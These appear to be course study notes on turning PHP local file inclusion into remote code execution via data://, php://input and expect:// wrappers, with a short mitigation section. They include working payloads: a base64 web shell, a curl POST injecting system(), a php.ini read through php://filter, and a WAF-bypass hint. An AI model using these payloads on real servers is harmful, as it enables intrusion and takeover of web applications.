# PHP Wrappers

### From LFI to RCE

* The section shifts from reading files to achieving remote code execution.
* SSH keys and credential extraction are mentioned, but the emphasis is on direct execution through wrappers.

### PHP Wrappers for RCE

* Three primary wrappers:

  * `data://`
  * `input://`
  * `expect://`
* Wrappers behave differently depending on PHP configuration.

---

## Checking PHP Configuration

* Critical settings:

  * `allow_url_include`
  * `allow_url_fopen`
  * `extension=expect`
* These can be verified via:

  * Reading `php.ini`
  * Using `phpinfo()` if accessible
  * Using LFI + `php://filter` to extract `php.ini`

### Example (Base64-encoded `php.ini`)

```
php://filter/read=convert.base64-encode/resource=/etc/php.ini
```

---

## data:// Wrapper

* Allows including arbitrary data as a stream.
* **Requires:** `allow_url_include = On`
* Payload is typically base64-encoded PHP code.

### Example

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
```

* Executed via LFI:

```
?page=data://text/plain;base64,<payload>
```

---

## input:// Wrapper

* Executes raw POST body as PHP code.
* **Requires:** `allow_url_include = On`
* PHP code is supplied in POST; command via GET.

### Example

```
curl -X POST "http://target/?cmd=id" \
     --data '<?php system($_GET["cmd"]); ?>'
```

---

## expect:// Wrapper

* Executes shell commands natively.
* **Requires:** PHP `expect` extension enabled.
* No encoding required.

### Example

```
?page=expect://id
```

---

## Additional Notes

### Other Wrappers

* `phar://` and `zip://` are valuable for combining LFI with file-upload vectors.
* These wrappers depend on their respective PHP extensions.

### Mitigation

* `allow_url_include` should **never** be enabled in production.
* The `expect` extension should be disabled unless explicitly required.
* Proper sanitization and strong file inclusion restrictions are essential.
* Error messages must be minimized; verbose output assists attackers.
* Attackers often combine wrappers with:
  * LFI
  * Log poisoning
  * File uploads
  * Session poisoning
* WAFs may partially block `data://` or `expect://`; encoding or alternate wrappers may bypass them.
